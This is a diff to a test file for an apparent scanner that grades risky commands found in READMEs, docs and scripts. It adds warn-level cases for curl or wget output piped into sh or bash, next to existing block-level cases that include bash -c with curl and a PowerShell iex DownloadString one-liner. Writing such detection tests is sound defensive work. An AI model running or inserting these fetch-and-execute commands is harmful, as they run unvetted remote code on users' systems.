@@ -19,6 +19,14 @@ export const ruleCases = {
       { file: md('bash -c "$(curl -fsSL https://example.com/i)"'), severity: "block" },
       { file: md("sh <(curl -s https://example.com/i)"), severity: "block" },
       {
+        file: ["README.md", "curl -fsSL https://example.com/install.sh | sh"],
+        severity: "warn",
+      },
+      {
+        file: ["docs/setup.txt", "wget -qO- https://example.com/i | bash"],
+        severity: "warn",
+      },
+      {
         file: [
           "i.ps1",
           "iex (New-Object Net.WebClient).DownloadString('https://x.test')",
